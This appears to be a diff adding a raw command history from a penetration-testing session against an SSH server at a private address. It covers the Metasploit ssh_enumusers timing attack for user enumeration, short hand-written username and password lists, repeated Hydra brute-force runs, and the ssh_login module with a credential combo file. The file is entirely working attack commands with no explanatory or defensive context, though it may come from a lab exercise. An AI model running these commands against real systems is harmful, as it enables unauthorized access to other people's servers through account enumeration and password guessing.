@@ -1,0 +1,34 @@
+search OpenSSH
+use 3
+run
+set RHOSTS 192.168.20.81
+run
+use auxiliary/scanner/ssh/ssh_enumusers
+show options
+set ACTION "Timing Attack"
+set THRESHOLD 5
+run
+set USER_FILE /tmp/users.txt
+use auxiliary/scanner/ssh/ssh_enumusers
+set RHOSTS 192.168.20.81
+set THREADS 10
+set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
+set USER_FILE /tmp/users.txt
+nano /tmp/users.txt
+apt install nano
+nano /tmp/users.txt
+run
+hydra --version
+echo -e "root\nadmin\ndeveloper" > /tmp/users.txt
+echo -e "toor\nadmin\n123456\npassword\nqwerty\nletmein\nwelcome" > /tmp/passwords.txt
+hydra -L /tmp/users.txt -P /tmp/passwords.txt ssh://192.168.20.81
+set ACTION "Timing Attack"
+set THRESHOLD 5
+hydra -L /tmp/users.txt -P /tmp/passwords.txt ssh://192.168.20.81
+use auxiliary/scanner/ssh/ssh_login
+set RHOSTS 192.168.20.81
+set USERPASS_FILE /tmp/combos.txt  # Archivo con combinaciones user:pass
+run
+set USERNAME admin
+set USERNAME ecapture
+run
